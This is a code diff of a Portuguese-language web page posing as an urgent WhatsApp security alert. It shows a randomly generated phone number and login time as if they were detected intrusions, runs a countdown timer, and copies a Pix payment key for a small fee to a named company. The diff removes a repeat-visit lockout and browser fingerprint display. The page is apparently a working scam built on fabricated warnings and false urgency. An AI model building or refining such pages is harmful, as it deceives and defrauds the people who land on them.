@@ -29,12 +29,9 @@
     }
     .copiado { color: green; font-size: 14px; margin-top: 8px; }
     .contador { color: orange; font-size: 15px; margin-top: 18px; }
-    .bloqueado { color: red; font-weight: bold; margin-top: 30px; font-size: 18px; }
   </style>
 </head>
 <body>
-
-  <div id="bloqueio"></div>
 
   <div id="conteudo">
 
@@ -46,8 +43,7 @@
     <div class="info">
       Detectamos um possível acesso indevido ao seu WhatsApp:<br>
       Número: <b id="numero"></b><br>
-      Localização suspeita: <b>São Paulo – <span id="hora"></span></b><br>
-      Navegador identificado: <b><span id="navegador"></span></b><br><br>
+      Localização suspeita: <b>São Paulo – <span id="hora"></span></b><br><br>
 
       O sistema ativou automaticamente o protocolo de emergência IA WhatsApp Protect,<br>
       com escaneamento de ameaças em tempo real utilizando <b>tecnologia de Inteligência Artificial</b>.<br><br>
@@ -66,16 +62,7 @@
   </div>
 
   <script>
-    // BLOQUEIO de retorno
-    if (localStorage.getItem("acesso") === "bloqueado") {
-      document.getElementById("conteudo").style.display = "none";
-      document.getElementById("bloqueio").innerHTML =
-        "<div class='bloqueado'>⚠️ Este acesso já foi autenticado.<br>Transação única por dispositivo.</div>";
-    } else {
-      localStorage.setItem("acesso", "bloqueado");
-    }
-
-    // Número parcialmente mascarado
+    // Número aleatório e mascarado
     function gerarNumero() {
       const final1 = Math.floor(Math.random() * 90 + 10);
       const final2 = Math.floor(Math.random() * 90 + 10);
@@ -83,32 +70,13 @@
     }
     document.getElementById("numero").innerText = gerarNumero();
 
-    // Hora aleatória
+    // Horário aleatório
     function gerarHora() {
       const h = String(Math.floor(Math.random() * 5) + 1).padStart(2, '0');
       const m = String(Math.floor(Math.random() * 60)).padStart(2, '0');
       return `${h}:${m}h`;
     }
     document.getElementById("hora").innerText = gerarHora();
-
-    // Identificar navegador
-    function detectarNavegador() {
-      const userAgent = navigator.userAgent;
-      if (userAgent.includes("Chrome") && !userAgent.includes("Edg") && !userAgent.includes("OPR")) {
-        return "Google Chrome";
-      } else if (userAgent.includes("Firefox")) {
-        return "Mozilla Firefox";
-      } else if (userAgent.includes("Edg")) {
-        return "Microsoft Edge";
-      } else if (userAgent.includes("OPR") || userAgent.includes("Opera")) {
-        return "Opera";
-      } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
-        return "Safari";
-      } else {
-        return "Navegador desconhecido";
-      }
-    }
-    document.getElementById("navegador").innerText = detectarNavegador();
 
     // Timer regressivo
     let segundos = 90;
@@ -123,7 +91,7 @@
       }
     }, 1000);
 
-    // Copiar Pix
+    // Copiar chave Pix
     function copiarPix() {
       const chave = `00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/14e57911-d312-47bd-ac6d-0ae819a3772c52040000530398654044.905802BR5923SUL INTERMEDIACOES LTDA6009SAO PAULO62070503***6304BAAB`;
       navigator.clipboard.writeText(chave).then(() => {
